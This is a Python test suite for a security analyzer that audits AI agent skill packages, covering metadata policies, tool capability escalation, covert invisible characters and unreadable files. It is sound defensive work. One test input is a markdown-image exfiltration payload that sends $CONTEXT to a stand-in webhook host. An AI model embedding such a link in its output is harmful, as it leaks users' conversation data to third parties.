# SPDX-FileCopyrightText: 2026 Sebastien Rousseau
# SPDX-License-Identifier: Apache-2.0 OR MIT
"""The analyzer's failure paths, driven one at a time.

The canonical detections are covered in test_skill_contract.py and the
evasions in test_release_mechanics.py. What was never exercised is what the
analyzer does when a skill is *malformed*: metadata that is missing, broken
or the wrong shape, frontmatter that is absent, files it cannot read. Those
paths decide whether it fails closed, which is the property a security check
lives or dies by.
"""

from __future__ import annotations

import json
import os
import re
import shutil
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from .support import ROOT

sys.path.insert(0, str(ROOT / "scripts"))
from _lib import analyzer  # noqa: E402  (needs the scripts path first)


class Workspace(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="agtmls-analyzer-"))
        self.addCleanup(lambda: shutil.rmtree(self.tmp, ignore_errors=True))

    def skill(self, frontmatter: str | None = None, body: str = "# Skill\n", metadata=None) -> Path:
        directory = self.tmp / "skill"
        directory.mkdir(exist_ok=True)
        text = body if frontmatter is None else f"---\n{frontmatter}\n---\n\n{body}"
        (directory / "SKILL.md").write_text(text, encoding="utf-8")
        if isinstance(metadata, dict):
            (directory / "metadata.json").write_text(json.dumps(metadata), encoding="utf-8")
        elif isinstance(metadata, str):
            (directory / "metadata.json").write_text(metadata, encoding="utf-8")
        return directory

    def rules(self, findings) -> list[str]:
        return [finding.rule for finding in findings]


class DescribeInvisibleTests(unittest.TestCase):
    def test_a_listed_code_point_is_named(self) -> None:
        self.assertIn("Zero-width space", analyzer.describe_invisible("​"))

    def test_the_tag_block_is_named_as_a_covert_channel(self) -> None:
        self.assertEqual(analyzer.describe_invisible("\U000e0041"), "Covert tag character (U+E0041)")

    def test_a_variation_selector_is_named(self) -> None:
        self.assertEqual(analyzer.describe_invisible("︁"), "Variation selector (U+FE01)")

    def test_anything_else_falls_back_to_its_code_point(self) -> None:
        """Reached if the spec adds a range this table has no name for."""
        self.assertEqual(analyzer.describe_invisible(" "), "Invisible or format character (U+2028)")


class ScanTests(unittest.TestCase):
    def test_two_rules_with_one_message_on_one_line_report_once(self) -> None:
        pattern = re.compile("payload")
        findings = analyzer.scan(
            Path("x.md"), "payload\n", [(pattern, "AGT-A", "same"), (pattern, "AGT-B", "same")], "HIGH", "c"
        )
        self.assertEqual(len(findings), 1)

    def test_matches_on_different_lines_keep_their_own_line_numbers(self) -> None:
        findings = analyzer.scan(
            Path("x.md"), "payload\nclean\npayload\n", [(re.compile("payload"), "AGT-A", "m")], "HIGH", "c"
        )
        self.assertEqual([finding.line for finding in findings], [1, 3])

    def test_exfiltration_is_detected(self) -> None:
        findings = analyzer.check_data_exfiltration(Path("x.md"), "![x](https://webhook.example/c?d=$CONTEXT)")
        self.assertEqual([finding.rule for finding in findings], ["AGT-EXFIL-001"])


class ReadCappedTests(Workspace):
    def test_an_unreadable_path_is_refused_rather_than_raised(self) -> None:
        self.assertIsNone(analyzer.read_capped(self.tmp))  # a directory

    def test_an_unreadable_file_becomes_a_scan_finding(self) -> None:
        self.assertEqual(self.rules(analyzer.audit_file(self.tmp / "missing.md")), ["AGT-SCAN-001"])


class FrontmatterToolsTests(Workspace):
    def test_no_frontmatter_declares_no_tools(self) -> None:
        self.assertEqual(analyzer.frontmatter_tools(self.skill(body="# no frontmatter\n") / "SKILL.md"), [])

    def test_frontmatter_without_allowed_tools_declares_none(self) -> None:
        self.assertEqual(analyzer.frontmatter_tools(self.skill("name: x") / "SKILL.md"), [])

    def test_a_bracketed_quoted_list_is_unwrapped(self) -> None:
        tools = analyzer.frontmatter_tools(self.skill("allowed-tools: [Bash, 'Read']") / "SKILL.md")
        self.assertEqual(tools, ["Bash", "Read"])


class LoadPolicyTests(Workspace):
    def test_missing_metadata_fails_closed(self) -> None:
        policy, findings = analyzer.load_policy(self.skill("name: x"))
        self.assertEqual((policy, self.rules(findings)), ({}, ["AGT-POLICY-001"]))

    def test_missing_metadata_without_a_skill_file_points_at_the_directory(self) -> None:
        empty = self.tmp / "empty"
        empty.mkdir()
        _, findings = analyzer.load_policy(empty)
        self.assertEqual(findings[0].file_path, empty)

    def test_unparseable_metadata_fails_closed(self) -> None:
        policy, findings = analyzer.load_policy(self.skill("name: x", metadata="{ not json"))
        self.assertEqual((policy, self.rules(findings)), ({}, ["AGT-POLICY-002"]))

    def test_a_policy_that_is_not_an_object_fails_closed(self) -> None:
        policy, findings = analyzer.load_policy(self.skill("name: x", metadata={"safety_policy": ["no"]}))
        self.assertEqual((policy, self.rules(findings)), ({}, ["AGT-POLICY-003"]))

    def test_a_well_formed_policy_is_returned(self) -> None:
        policy, findings = analyzer.load_policy(
            self.skill("name: x", metadata={"safety_policy": {"network_access": "none"}})
        )
        self.assertEqual((policy, findings), ({"network_access": "none"}, []))


class CapabilityEscalationTests(Workspace):
    def escalations(self, tools: str, policy: dict) -> list[str]:
        return self.rules(analyzer.check_capability_escalation(self.skill(f"allowed-tools: [{tools}]"), policy))

    def test_no_skill_file_means_nothing_to_escalate(self) -> None:
        self.assertEqual(analyzer.check_capability_escalation(self.tmp, {}), [])

    def test_a_tool_that_grants_no_capability_is_ignored(self) -> None:
        self.assertEqual(self.escalations("Read", {}), [])

    def test_bash_under_a_policy_that_denies_commands_escalates(self) -> None:
        self.assertEqual(self.escalations("Bash", {"executes_commands": False}), ["AGT-CAP-001"])

    def test_bash_under_a_policy_that_allows_commands_does_not(self) -> None:
        self.assertEqual(self.escalations("Bash", {"executes_commands": True}), [])

    def test_web_fetch_needs_network_access_declared(self) -> None:
        self.assertEqual(self.escalations("WebFetch", {"network_access": "none"}), ["AGT-CAP-001"])
        self.assertEqual(self.escalations("WebFetch", {"network_access": "optional"}), [])


class SkillHonestyTests(Workspace):
    def test_a_directory_with_no_skill_file_is_not_judged(self) -> None:
        self.assertEqual(analyzer.check_skill_honesty(self.tmp), [])

    def test_a_skill_that_denies_commands_but_says_run_them_is_caught(self) -> None:
        skill = self.skill(
            "name: x", body="Run the following script to begin.\n", metadata={"safety_policy": {"executes_commands": False}}
        )
        self.assertIn("AGT-POLICY-004", self.rules(analyzer.check_skill_honesty(skill)))

    def test_a_skill_that_denies_commands_and_keeps_its_word_is_clean(self) -> None:
        skill = self.skill("name: x", body="Read carefully.\n", metadata={"safety_policy": {"executes_commands": False}})
        self.assertEqual(analyzer.check_skill_honesty(skill), [])

    def test_a_skill_that_denies_network_but_fetches_is_caught(self) -> None:
        skill = self.skill(
            "name: x", body="Download https://example.com/x first.\n", metadata={"safety_policy": {"network_access": "none"}}
        )
        self.assertIn("AGT-POLICY-005", self.rules(analyzer.check_skill_honesty(skill)))

    def test_a_skill_that_denies_network_and_keeps_its_word_is_clean(self) -> None:
        skill = self.skill("name: x", body="Work offline.\n", metadata={"safety_policy": {"network_access": "none"}})
        self.assertEqual(analyzer.check_skill_honesty(skill), [])


class AuditableFilesTests(Workspace):
    def names(self, root: Path) -> list[str]:
        return [path.relative_to(root).as_posix() for path in analyzer.auditable_files(root)]

    def test_a_file_target_is_audited_as_itself(self) -> None:
        target = self.tmp / "one.md"
        target.write_text("x", encoding="utf-8")
        self.assertEqual(list(analyzer.auditable_files(target)), [target])

    def test_selection_covers_text_and_executables_and_nothing_else(self) -> None:
        (self.tmp / "notes.md").write_text("x", encoding="utf-8")
        (self.tmp / "data.bin").write_bytes(b"\0")
        runner = self.tmp / "run"
        runner.write_text("#!/bin/sh\n", encoding="utf-8")
        runner.chmod(0o755)
        (self.tmp / "__pycache__").mkdir()
        (self.tmp / "__pycache__" / "cached.py").write_text("x", encoding="utf-8")
        os.symlink(self.tmp / "notes.md", self.tmp / "link.md")
        self.assertEqual(self.names(self.tmp), ["notes.md", "run"])

    def test_a_file_that_vanishes_mid_walk_is_skipped(self) -> None:
        (self.tmp / "gone.md").write_text("x", encoding="utf-8")
        (self.tmp / "kept.md").write_text("x", encoding="utf-8")
        real = Path.lstat

        def flaky(path: Path, *args, **kwargs):
            if path.name == "gone.md":
                raise FileNotFoundError(path)
            return real(path, *args, **kwargs)

        with mock.patch.object(Path, "lstat", flaky):
            self.assertEqual(self.names(self.tmp), ["kept.md"])


class AuditTargetTests(Workspace):
    def test_a_single_file_is_not_judged_as_a_skill(self) -> None:
        target = self.tmp / "loose.md"
        target.write_text("clean\n", encoding="utf-8")
        self.assertEqual(analyzer.audit_skill_target(target), [])

    def test_a_directory_is_judged_as_a_skill(self) -> None:
        self.assertIn("AGT-POLICY-001", self.rules(analyzer.audit_skill_target(self.skill("name: x"))))


if __name__ == "__main__":
    unittest.main()
